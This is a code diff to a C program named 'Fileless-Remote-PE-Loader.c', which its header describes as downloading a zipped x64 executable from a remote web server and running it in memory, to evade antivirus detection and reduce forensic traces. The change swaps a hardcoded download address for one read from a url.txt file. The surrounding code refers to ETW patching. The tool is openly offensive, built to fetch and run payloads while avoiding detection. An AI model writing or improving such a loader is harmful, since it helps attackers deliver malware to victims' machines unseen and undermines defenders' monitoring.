@@ -1,5 +1,5 @@
 // =====================================================================================================================================================================
-// 'Fileless-Remote-PE-Loader.c' enables direct in-memory execution of a remote x64 PE file (exe embeded in a zip file) retrieved from a web server.
+// 'Fileless-Remote-PE-Loader.c' enables direct in-memory execution of a x64 PE file (exe embeded in a zip file) retrieved from a remote web server.
 // It downloads, decompresses (unzip), and loads offensive security executables without writing them to disk to evade static AV detection and reduce forensic footprint.
 // Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
 // =====================================================================================================================================================================
@@ -291,8 +291,27 @@ int main(int argc, char *argv[]) {
 		printf("[*] ETW patching completed.\n");
 	}
 
+    const char *filename = "url.txt";
+    char url[1024];  
+
+    FILE *file = fopen(filename, "r");
+    if (!file) {
+        perror("[!] Failed to open url.txt");
+        return 1;
+    }
+
+    if (fgets(url, sizeof(url), file) == NULL) {
+        fprintf(stderr, "Failed to read from file\n");
+        fclose(file);
+        return 1;
+    }
+
+    // Remove newline character if present
+    url[strcspn(url, "\n")] = 0;
+    fclose(file);
+
     DWORD zipSize = 0;
-    BYTE *zipData = DownloadZipToMemory("http://192.168.1.144:8081/test.zip", &zipSize);
+    BYTE *zipData = DownloadZipToMemory(url, &zipSize);
     if (!zipData) {
         printf("[!] Download failed.\n");
         return 1;
